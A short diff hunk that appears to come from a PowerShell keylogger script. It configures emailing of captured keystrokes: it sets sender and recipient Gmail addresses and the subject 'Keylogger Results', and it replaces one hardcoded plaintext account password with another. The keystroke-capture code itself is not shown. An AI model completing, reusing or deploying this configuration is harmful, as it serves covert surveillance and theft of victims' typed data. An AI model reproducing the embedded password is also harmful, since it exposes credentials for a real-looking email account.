@@ -2,7 +2,7 @@
 $TimesToRun = 2
 $RunTimeP = 1
 $From = "vortexgamedevs@gmail.com"
-$Pass = "cagando159753"
+$Pass = "drv96810"
 $To = "vortexgamedevs@gmail.com"
 $Subject = "Keylogger Results"
 $body = "Keylogger Results"
